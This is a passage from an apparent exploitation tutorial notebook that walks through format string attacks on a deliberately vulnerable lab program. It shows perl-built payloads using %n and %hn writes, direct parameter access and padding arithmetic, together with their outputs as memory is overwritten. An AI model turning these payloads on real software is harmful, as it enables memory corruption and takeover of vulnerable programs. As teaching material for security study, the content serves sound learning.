    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%126x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 52,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\r\n"
     ]
    }
   ],
   "source": [
    "! echo $(( 0xbb - 0xaa ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 53,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%126x%n%17x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bffffcc80f7dd0658                                                                                                                       80484f0         4b4e554a\r\n",
      "[*] test_val @ 0x0804a02c = 48042 0x0000bbaa\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xbb in correct address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%126x%n%17x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\r\n"
     ]
    }
   ],
   "source": [
    "! echo $(( 0xcc - 0xbb ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%126x%n%17x%n%17x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bffffcc80f7dd0658                                                                                                                       80484f0         4b4e554a         4b4e554a\r\n",
      "[*] test_val @ 0x0804a02c = 13417386 0x00ccbbaa\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xcc in correct address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%126x%n%17x%n%17x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# finally write 0xdd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 56,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "17\r\n"
     ]
    }
   ],
   "source": [
    "! echo $(( 0xdd - 0xcc ))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 107,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\b%x%x%133x%n%17x%n%17x%n%17x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bJUNK-�\u0004\bJUNK.�\u0004\bJUNK/�\u0004\bbfffe8100                                                                                                                             b7fff858         4b4e554a         4b4e554a         4b4e554a\r\n",
      "[*] test_val @ 0x0804a02c = -573785174 0xddccbbaa\r\n"
     ]
    }
   ],
   "source": [
    "# now write 0xcc in correct address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08JUNK\\x2d\\xa0\\x04\\x08JUNK\\x2e\\xa0\\x04\\x08JUNK\\x2f\\xa0\\x04\\x08\"')%x%x%133x%n%17x%n%17x%n%17x%n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Direct Parameter Access\n",
    "- simplified way to exploit format string vulnerability\n",
    "- allows parameters to be accessed directly by using the dollar sign qualifier\n",
    "    - e.g., `%n$d` would access the nth parameter and display it as a decimal number\n",
    "- instead of sequentially accessing the first three parameters and using 4 bytes spacers of JUNK to increment the byte output count, we can use direct parameter access\n",
    "- let's write a more realistic-looking address of `0xbffffd72` into the variable test_vals\n",
    "- see e.g. of how direct parameter access works using example provided in demo-programs"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "metadata": {},
   "outputs": [],
   "source": [
    "! cp ./demo-programs/fmtstr_directpara.c ."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 60,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "\r\n",
      "int main() {\r\n",
      "    printf(\"7th: %7$d, 4th: %4$05d\\n\", 10, 20, 30, 40, 50, 60, 70, 80);\r\n",
      "    return 0;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat fmtstr_directpara.c"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "metadata": {},
   "outputs": [],
   "source": [
    "! ./compile.sh fmtstr_directpara.c directpara.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 61,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "7th: 70, 4th: 00040\r\n"
     ]
    }
   ],
   "source": [
    "! ./directpara.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%x%x%x%x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAAffffcca0f7dd065880484f041414141\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# without direct access\n",
    "! ./fmt_vuln.exe AAAA%x%x%x%x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$x\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "AAAA41414141\r\n",
      "[*] test_val @ 0x0804a02c = -72 0xffffffb8\r\n"
     ]
    }
   ],
   "source": [
    "# access the fourth argument (from beginning of the format string)\n",
    "# $ sign is special character for bash so must be escaped\n",
    "! ./fmt_vuln.exe AAAA%4\\$x"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      "AAAA%4$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      "Segmentation fault\r\n"
     ]
    }
   ],
   "source": [
    "# use the same technique to write to 4th argument\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"AAAA\"')%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%4$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b\r\n",
      "[*] test_val @ 0x0804a02c = 4 0x00000004\r\n"
     ]
    }
   ],
   "source": [
    "# don't get segfault if AAAA was a valid memory address\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b%4$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b\r\n",
      "[*] test_val @ 0x0804a02c = 16 0x00000010\r\n"
     ]
    }
   ],
   "source": [
    "# no need of JUNK just use direct parameter access to write the rest\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\" . \"\\x2d\\xa0\\x04\\x08\" . \"\\x2e\\xa0\\x04\\x08\" . \"\\x2f\\xa0\\x04\\x08\"')%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "98\r\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0x72 of our controlled address: 0xbffffd72\n",
    "! echo $((0x72 - 16))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 68,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b%98x%4$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b                                                                                          ffffcca0\r\n",
      "[*] test_val @ 0x0804a02c = 114 0x00000072\r\n"
     ]
    }
   ],
   "source": [
    "# use 98 as width to get 0x72 as least significant value\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\" . \"\\x2d\\xa0\\x04\\x08\" . \"\\x2e\\xa0\\x04\\x08\" . \"\\x2f\\xa0\\x04\\x08\"')%98x%4\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 69,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "139\r\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0xfd of our controlled address: 0xbffffd72\n",
    "! echo $((0xfd-0x72))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 70,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b%98x%4$n%139x%5$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b                                                                                          ffffcc90                                                                                                                                   f7dd0658\r\n",
      "[*] test_val @ 0x0804a02c = 64882 0x0000fd72\r\n"
     ]
    }
   ],
   "source": [
    "# use 139 as width to get 0xfd as next value\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\" . \"\\x2d\\xa0\\x04\\x08\" . \"\\x2e\\xa0\\x04\\x08\" . \"\\x2f\\xa0\\x04\\x08\"')%98x%4\\$n%139x%5\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 71,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "2\r\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0xff of our controlled address: 0xbffffd72\n",
    "! echo $((0xff-0xfd))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "258\r\n"
     ]
    }
   ],
   "source": [
    "# width of 2 doesn't work; shorter than memory address!\n",
    "# do some math to print 0xff of our controlled address: 0xbffffd72\n",
    "! echo $((0x1ff-0xfd))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b%98x%4$n%139x%5$n%258x%6$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b                                                                                          ffffcc80                                                                                                                                   f7dd0658                                                                                                                                                                                                                                                           80484f0\r\n",
      "[*] test_val @ 0x0804a02c = 33553778 0x01fffd72\r\n"
     ]
    }
   ],
   "source": [
    "# use 2 as width to get 0xff as next value\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\" . \"\\x2d\\xa0\\x04\\x08\" . \"\\x2e\\xa0\\x04\\x08\" . \"\\x2f\\xa0\\x04\\x08\"')%98x%4\\$n%139x%5\\$n%258x%6\\$n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 74,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-64\r\n"
     ]
    }
   ],
   "source": [
    "# do some math to print 0xbf of our controlled address: 0xbffffd72\n",
    "! echo $((0xbf-0xff))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 75,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "192\r\n"
     ]
    }
   ],
   "source": [
    "# negative width will not work!\n",
    "! echo $((0x1bf-0xff))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 76,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b%98x%4$n%139x%5$n%258x%6$n%192x%7$n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b-�\u0004\b.�\u0004\b/�\u0004\b                                                                                          ffffcc80                                                                                                                                   f7dd0658                                                                                                                                                                                                                                                           80484f0                                                                                                                                                                                         804a02c\r\n",
      "[*] test_val @ 0x0804a02c = -1073742478 0xbffffd72\r\n"
     ]
    }
   ],
   "source": [
    "# use 2 as width to get 0xff as next value\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\" . \"\\x2d\\xa0\\x04\\x08\" . \"\\x2e\\xa0\\x04\\x08\" . \"\\x2f\\xa0\\x04\\x08\"')%98x%4\\$n%139x%5\\$n%258x%6\\$n%192x%7\\$n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Using Short (2 bytes) Writes\n",
    "- a `short` is typically a two-byte word using `h`\n",
    "- helps write an entire four-byte value with just two `%hn` parameters\n",
    "    - instead of 4!\n",
    "- let's overwrite test_val variable with the address `0xbffffd72`"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%x%n\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0f7dd065880484f0\r\n",
      "[*] test_val @ 0x0804a02c = 27 0x0000001b\r\n"
     ]
    }
   ],
   "source": [
    "# update least significant byte\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%x%n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 77,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b%x%x%x%hn\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\bffffcca0f7dd065880484f0\r\n",
      "[*] test_val @ 0x0804a02c = -65509 0xffff001b\r\n"
     ]
    }
   ],
   "source": [
    "# update first two bytes starting\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\"')%x%x%x%hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 80,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ".�\u0004\b%4$hn\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ".�\u0004\b\r\n",
      "[*] test_val @ 0x0804a02c = 327608 0x0004ffb8\r\n"
     ]
    }
   ],
   "source": [
    "# short write can be used with direct parameter access\n",
    "# update last two bytes\n",
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2e\\xa0\\x04\\x08\"')%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 81,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "64874\r\n"
     ]
    }
   ],
   "source": [
    "# lets write 0xbffffd72 to test_val\n",
    "# 0xfd72 is written in first two (lower) bytes\n",
    "# Since 8 bytes of memory addresses will be written, subtract it from actual\n",
    "#  ./fmt_vuln.exe $(printf \"\\x2c\\xa0\\x04\\x08\\x2e\\xa0\\x04\\x08\")%[w]x%4\\$hn%[w]x%5\\%hn\n",
    "! echo $((0xfd72-8))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b.�\u0004\b%64874x%4$hn\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b.�\u0004\b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  ffffcca0\r\n",
      "[*] test_val @ 0x0804a02c = -654 0xfffffd72\r\n"
     ]
    }
   ],
   "source": [
    "! ./fmt_vuln.exe $(perl -e 'print \"\\x2c\\xa0\\x04\\x08\\x2e\\xa0\\x04\\x08\"')%64874x%4\\$hn"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 82,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-15731\r\n"
     ]
    }
   ],
   "source": [
    "# 0xbfff is written in last two (higher bytes)\n",
    "! echo $((0xbfff-0xfd72))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "49805\r\n"
     ]
    }
   ],
   "source": [
    "# smaller than previous width so..\n",
    "! echo $((0x1bfff-0xfd72))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 84,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "The right way to print user-controlled input:\r\n",
      ",�\u0004\b.�\u0004\b%64874x%4$hn%49805x%5$hn\r\n",
      "The wrong way to print user-controlled input:\r\n",
      ",�\u0004\b.�\u0004\b                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             